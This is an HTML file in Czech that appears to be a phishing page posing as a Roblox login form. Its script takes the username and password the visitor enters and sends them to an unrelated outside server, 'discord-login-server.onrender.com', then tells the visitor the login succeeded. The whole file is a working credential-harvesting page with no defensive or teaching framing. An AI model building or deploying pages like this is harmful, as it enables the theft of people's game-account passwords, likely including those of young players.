<!DOCTYPE html>
<html lang="cs">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Roblox Přihlášení</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      width: 300px;
      text-align: center;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      background-color: #e2231a;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }
    #message {
      font-size: 14px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Roblox Přihlášení</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Uživatelské jméno" required />
      <input type="password" id="password" placeholder="Heslo" required />
      <button type="submit">Přihlásit</button>
    </form>
    <div id="message"></div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const message = document.getElementById("message");

      message.style.color = "black";
      message.textContent = "⏳ Odesílání...";

      fetch("https://discord-login-server.onrender.com/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ username, password })
      })
      .then(res => {
        if (res.ok) {
          message.textContent = "✅ Přihlášení úspěšné!";
          message.style.color = "green";
        } else {
          message.textContent = "❌ Chyba při přihlašování.";
          message.style.color = "red";
        }
      })
      .catch(err => {
        message.textContent = "❌ Server nedostupný.";
        message.style.color = "red";
        console.error("Chyba spojení:", err);
      });
    });
  </script>
</body>
</html>
